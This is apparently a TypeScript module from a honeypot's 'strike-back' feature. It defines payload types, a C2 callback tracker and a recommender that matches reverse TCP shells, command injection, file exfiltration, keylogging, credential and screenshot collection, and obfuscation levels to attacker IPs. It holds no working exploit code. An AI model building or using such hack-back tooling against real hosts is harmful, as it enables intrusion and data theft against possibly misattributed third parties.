/**
 * Payload Type Definitions and Management
 *
 * TypeScript interfaces and utilities for managing strike-back payloads.
 * Provides type-safe payload configuration, validation, and metadata tracking.
 */

import type { AttackEvent, PayloadType } from "../../../lib_deno/types.ts";

/**
 * Payload metadata
 */
export interface PayloadMetadata {
  payloadId: string;
  attackId: number;
  attackerIp: string;
  payloadType: PayloadType;
  threatScore: number;
  createdAt: string;
  expiresAt: string;
  deliveredAt?: string;
  lastCallbackAt?: string;
  status: PayloadStatus;
  deliveryMethod: string;
  obfuscationLevel: ObfuscationLevel;
  c2CallbackCount: number;
  maxCallbacks: number;
  deliveryCount: number;
}

/**
 * Payload status
 */
export enum PayloadStatus {
  Ready = "ready",
  Delivered = "delivered",
  Active = "active",
  Expired = "expired",
  Terminated = "terminated",
}

/**
 * Obfuscation levels
 */
export enum ObfuscationLevel {
  None = "none",
  Light = "light",
  Medium = "medium",
  Heavy = "heavy",
}

/**
 * Payload configuration for generation
 */
export interface PayloadGenerationConfig {
  attackEvent: AttackEvent;
  payloadType: PayloadType;
  threatScore: number;
  obfuscationLevel: ObfuscationLevel;
  expirationHours: number;
  maxCallbacks: number;
  c2Port: number;
  customVars?: Record<string, string>;
}

/**
 * Payload intelligence data
 */
export interface PayloadIntelligence {
  id?: number;
  payloadId: string;
  timestamp: string;
  dataType: IntelligenceDataType;
  data: Record<string, unknown>;
  attackerIp: string;
}

/**
 * Intelligence data types
 */
export enum IntelligenceDataType {
  SystemInfo = "system_info",
  BrowserInfo = "browser_info",
  NetworkInfo = "network_info",
  FileSystem = "file_system",
  ProcessList = "process_list",
  Credentials = "credentials",
  Screenshot = "screenshot",
  Keylog = "keylog",
  Heartbeat = "heartbeat",
  Error = "error",
}

/**
 * C2 callback data
 */
export interface C2CallbackData {
  payloadId: string;
  timestamp: string;
  dataType: IntelligenceDataType;
  data: Record<string, unknown>;
  sequence?: number;
  encrypted?: boolean;
}

/**
 * Payload recommendation
 */
export interface PayloadRecommendation {
  payloadType: PayloadType;
  confidence: number;
  reason: string;
  obfuscationLevel: ObfuscationLevel;
  estimatedRisk: RiskLevel;
}

/**
 * Risk levels
 */
export enum RiskLevel {
  Low = "low",
  Medium = "medium",
  High = "high",
  Critical = "critical",
}

/**
 * Payload validation result
 */
export interface PayloadValidation {
  valid: boolean;
  errors: string[];
  warnings: string[];
}

/**
 * Payload template variables
 */
export interface TemplateVariables {
  payloadId: string;
  c2Url: string;
  callbackUrl: string;
  heartbeatUrl: string;
  encryptionKey: string;
  hmacKey: string;
  maxCallbacks: number;
  beaconInterval?: number;
  targetInfo?: {
    ip: string;
    port: number;
    protocol: string;
  };
  customVars?: Record<string, string>;
}

/**
 * Payload Manager - High-level payload operations
 */
export class PayloadManager {
  private payloads: Map<string, PayloadMetadata>;
  private intelligence: Map<string, PayloadIntelligence[]>;

  constructor() {
    this.payloads = new Map();
    this.intelligence = new Map();
  }

  /**
   * Register a new payload
   */
  registerPayload(metadata: PayloadMetadata): void {
    this.payloads.set(metadata.payloadId, metadata);
    this.intelligence.set(metadata.payloadId, []);
  }

  /**
   * Get payload metadata
   */
  getPayload(payloadId: string): PayloadMetadata | undefined {
    return this.payloads.get(payloadId);
  }

  /**
   * Update payload status
   */
  updateStatus(payloadId: string, status: PayloadStatus): void {
    const payload = this.payloads.get(payloadId);
    if (payload) {
      payload.status = status;
      if (status === PayloadStatus.Delivered && !payload.deliveredAt) {
        payload.deliveredAt = new Date().toISOString();
      }
    }
  }

  /**
   * Record callback
   */
  recordCallback(
    payloadId: string,
    data: PayloadIntelligence,
  ): void {
    const payload = this.payloads.get(payloadId);
    if (payload) {
      payload.c2CallbackCount++;
      payload.lastCallbackAt = new Date().toISOString();

      const intel = this.intelligence.get(payloadId);
      if (intel) {
        intel.push(data);
      }

      // Check if max callbacks reached
      if (payload.c2CallbackCount >= payload.maxCallbacks) {
        this.updateStatus(payloadId, PayloadStatus.Terminated);
      }
    }
  }

  /**
   * Get intelligence for payload
   */
  getIntelligence(payloadId: string): PayloadIntelligence[] {
    return this.intelligence.get(payloadId) || [];
  }

  /**
   * Get active payloads
   */
  getActivePayloads(): PayloadMetadata[] {
    return Array.from(this.payloads.values()).filter(
      (p) => p.status === PayloadStatus.Active || p.status === PayloadStatus.Delivered,
    );
  }

  /**
   * Cleanup expired payloads
   */
  cleanupExpired(): number {
    const now = new Date();
    let count = 0;

    for (const [payloadId, payload] of this.payloads.entries()) {
      const expires = new Date(payload.expiresAt);
      if (expires < now && payload.status !== PayloadStatus.Expired) {
        this.updateStatus(payloadId, PayloadStatus.Expired);
        count++;
      }
    }

    return count;
  }

  /**
   * Terminate payload
   */
  terminatePayload(payloadId: string): boolean {
    const payload = this.payloads.get(payloadId);
    if (payload) {
      this.updateStatus(payloadId, PayloadStatus.Terminated);
      return true;
    }
    return false;
  }

  /**
   * Get statistics
   */
  getStatistics(): PayloadStatistics {
    const payloads = Array.from(this.payloads.values());

    return {
      total: payloads.length,
      ready: payloads.filter((p) => p.status === PayloadStatus.Ready).length,
      delivered: payloads.filter((p) => p.status === PayloadStatus.Delivered).length,
      active: payloads.filter((p) => p.status === PayloadStatus.Active).length,
      expired: payloads.filter((p) => p.status === PayloadStatus.Expired).length,
      terminated: payloads.filter((p) => p.status === PayloadStatus.Terminated).length,
      totalCallbacks: payloads.reduce((sum, p) => sum + p.c2CallbackCount, 0),
      totalDeliveries: payloads.reduce((sum, p) => sum + p.deliveryCount, 0),
      totalIntelligence: Array.from(this.intelligence.values()).reduce(
        (sum, intel) => sum + intel.length,
        0,
      ),
    };
  }
}

/**
 * Payload statistics
 */
export interface PayloadStatistics {
  total: number;
  ready: number;
  delivered: number;
  active: number;
  expired: number;
  terminated: number;
  totalCallbacks: number;
  totalDeliveries: number;
  totalIntelligence: number;
}

/**
 * Recommend payload type based on attack characteristics
 */
export function recommendPayloadType(
  event: AttackEvent,
  threatScore: number,
  sessionData?: any,
): PayloadRecommendation {
  // Critical threats (9.0+)
  if (threatScore >= 9.0) {
    if (event.service_type === 2) {
      // SSH
      return {
        payloadType: 0, // ReverseTCP
        confidence: 0.9,
        reason: "Critical threat on SSH service - reverse TCP recommended",
        obfuscationLevel: ObfuscationLevel.Heavy,
        estimatedRisk: RiskLevel.Critical,
      };
    }
    if (event.payload.includes("UNION") || event.payload.includes("SELECT")) {
      return {
        payloadType: 1, // CommandInjection
        confidence: 0.85,
        reason: "SQL injection detected - command injection payload recommended",
        obfuscationLevel: ObfuscationLevel.Heavy,
        estimatedRisk: RiskLevel.Critical,
      };
    }
    return {
      payloadType: 6, // SystemInfo
      confidence: 0.8,
      reason: "Critical threat - comprehensive system info recommended",
      obfuscationLevel: ObfuscationLevel.Heavy,
      estimatedRisk: RiskLevel.Critical,
    };
  }

  // High threats (8.0+)
  if (threatScore >= 8.0) {
    if (sessionData?.protocol_count > 1) {
      return {
        payloadType: 4, // NetworkScanner
        confidence: 0.85,
        reason: "Multi-protocol attack detected - network scanner recommended",
        obfuscationLevel: ObfuscationLevel.Medium,
        estimatedRisk: RiskLevel.High,
      };
    }
    return {
      payloadType: 5, // BrowserRecon
      confidence: 0.75,
      reason: "High threat - browser reconnaissance recommended",
      obfuscationLevel: ObfuscationLevel.Medium,
      estimatedRisk: RiskLevel.High,
    };
  }

  // Medium threats (threshold+)
  if (sessionData?.attack_count > 3) {
    return {
      payloadType: 7, // Beacon
      confidence: 0.7,
      reason: "Persistent attacker - beacon payload for tracking",
      obfuscationLevel: ObfuscationLevel.Light,
      estimatedRisk: RiskLevel.Medium,
    };
  }

  return {
    payloadType: 6, // SystemInfo
    confidence: 0.65,
    reason: "Standard threat - basic system info collection",
    obfuscationLevel: ObfuscationLevel.Light,
    estimatedRisk: RiskLevel.Medium,
  };
}

/**
 * Validate payload configuration
 */
export function validatePayloadConfig(
  config: PayloadGenerationConfig,
): PayloadValidation {
  const errors: string[] = [];
  const warnings: string[] = [];

  // Validate attack event
  if (!config.attackEvent) {
    errors.push("Attack event is required");
  } else {
    if (!config.attackEvent.source_ip) {
      errors.push("Source IP is required");
    }
    if (config.attackEvent.service_type === undefined) {
      errors.push("Service type is required");
    }
  }

  // Validate payload type
  if (config.payloadType === undefined || config.payloadType === null) {
    errors.push("Payload type is required");
  } else if (config.payloadType < 0 || config.payloadType > 7) {
    errors.push("Invalid payload type");
  } else if (config.payloadType === 3) {
    // LogWiper
    errors.push("LogWiper payload is prohibited");
  }

  // Validate threat score
  if (config.threatScore < 0 || config.threatScore > 10) {
    errors.push("Threat score must be between 0 and 10");
  } else if (config.threatScore < 5) {
    warnings.push("Low threat score - consider if deployment is necessary");
  }

  // Validate expiration
  if (config.expirationHours <= 0) {
    errors.push("Expiration hours must be positive");
  } else if (config.expirationHours > 720) {
    // 30 days
    warnings.push("Expiration exceeds 30 days - consider shorter duration");
  }

  // Validate max callbacks
  if (config.maxCallbacks <= 0) {
    errors.push("Max callbacks must be positive");
  } else if (config.maxCallbacks > 1000) {
    warnings.push("Max callbacks exceeds 1000 - consider lower limit");
  }

  // Validate C2 port
  if (config.c2Port < 1 || config.c2Port > 65535) {
    errors.push("C2 port must be between 1 and 65535");
  }

  // High-risk payload warnings
  const highRiskPayloads = [0, 1, 2]; // ReverseTCP, CommandInjection, FileExfiltration
  if (highRiskPayloads.includes(config.payloadType)) {
    warnings.push(
      `Payload type ${config.payloadType} is high-risk - ensure proper authorization`,
    );
  }

  return {
    valid: errors.length === 0,
    errors,
    warnings,
  };
}

/**
 * Calculate recommended obfuscation level
 */
export function recommendObfuscationLevel(
  payloadType: PayloadType,
  threatScore: number,
  serviceType: number,
): ObfuscationLevel {
  // High-risk payloads always use heavy obfuscation
  const highRiskPayloads = [0, 1, 2]; // ReverseTCP, CommandInjection, FileExfiltration
  if (highRiskPayloads.includes(payloadType)) {
    return ObfuscationLevel.Heavy;
  }

  // Critical threats use heavy obfuscation
  if (threatScore >= 9.0) {
    return ObfuscationLevel.Heavy;
  }

  // High threats use medium obfuscation
  if (threatScore >= 8.0) {
    return ObfuscationLevel.Medium;
  }

  // HTTP/HTTPS typically needs more obfuscation due to inspection
  if (serviceType === 0 || serviceType === 1) {
    return ObfuscationLevel.Medium;
  }

  // Default to light obfuscation
  return ObfuscationLevel.Light;
}
